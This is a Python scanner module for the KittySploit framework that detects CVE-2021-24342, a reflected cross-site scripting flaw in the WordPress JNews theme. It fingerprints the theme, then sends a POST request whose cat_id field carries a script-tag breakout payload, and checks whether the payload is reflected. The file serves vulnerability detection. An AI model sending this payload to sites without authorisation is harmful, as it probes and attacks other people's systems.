#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress JNews theme before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress JNews Theme <8.0.6 - Cross-Site Scripting Detection',
        'description': 'WordPress JNews theme before 8.0.6 contains a reflected cross-site scripting vulnerability. It does not sanitize the cat_id parameter in the POST request /?ajax-request=jnews (with action=jnews_build_mega_category_*).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'jnews', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/415ca763-fe65-48cb-acd3-b375a400217e',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24342',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24342',
    }

    def run(self):
        path = '/wp-content/themes/jnews/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Change Log:', 'JNews -',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/?ajax-request=jnews'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}, data='lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('Content-Type: text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress JNews Theme <8.0.6 - Cross-Site Scripting detected', path=path)
            return True
        return False

